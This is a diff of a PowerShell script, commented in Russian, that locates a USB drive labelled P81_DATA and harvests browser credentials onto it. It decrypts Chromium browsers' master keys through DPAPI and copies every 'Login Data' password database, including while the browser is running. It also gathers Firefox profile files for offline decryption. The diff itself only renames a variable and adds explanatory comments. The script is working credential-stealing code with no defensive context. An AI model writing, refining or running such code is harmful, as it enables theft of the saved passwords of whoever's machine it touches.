@@ -1,4 +1,4 @@
-# 1. Поиск флешки по метке
+# 1. Поиск флешки по метке P81_DATA
 $u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
 if (!$u) { exit }
 $u = "$($u):"
@@ -16,10 +16,10 @@ function Get-Key($statePath, $label, $destDir) {
     if (Test-Path $statePath) {
         try {
             $json = Get-Content $statePath -Raw | ConvertFrom-Json
-            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-            $encKey = $rawKey[5..($rawKey.Length-1)]
+            $rawBytes = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+            $encKey = $rawBytes[5..($rawBytes.Length-1)]
             
-            # Дешифровка мастер-ключа
+            # Дешифровка мастер-ключа через системный DPAPI
             $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
             $base64Key = [Convert]::ToBase64String($masterKey)
             
@@ -43,6 +43,7 @@ $browsers = @(
 foreach ($b in $browsers) {
     $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
     if (Test-Path $userDataPath) {
+        # Поиск всех файлов "Login Data" во всех профилях
         $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
         foreach ($file in $foundFiles) {
             $profileName = $file.Directory.Name
@@ -50,14 +51,15 @@ foreach ($b in $browsers) {
             $label = "$($b.name)_$($profileName)"
             
             if (Get-Key $localState $label $dest) {
-                # Копируем базу через xcopy (обходит блокировку занятых файлов)
+                # Копирование базы через xcopy (флаг /y подтверждает замену, /q скрывает вывод)
+                # Это позволяет копировать файлы, даже если браузер запущен
                 cmd /c "xcopy /y /q `"$($file.FullName)`" `"$dest\$($label)_db`""
             }
         }
     }
 }
 
-# 4. СБОР FIREFOX
+# 4. СБОР FIREFOX (Файлы для офлайн-дешифровки)
 $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
 if (Test-Path $ffPath) {
     cmd /c "mkdir $dest\FF 2>nul"
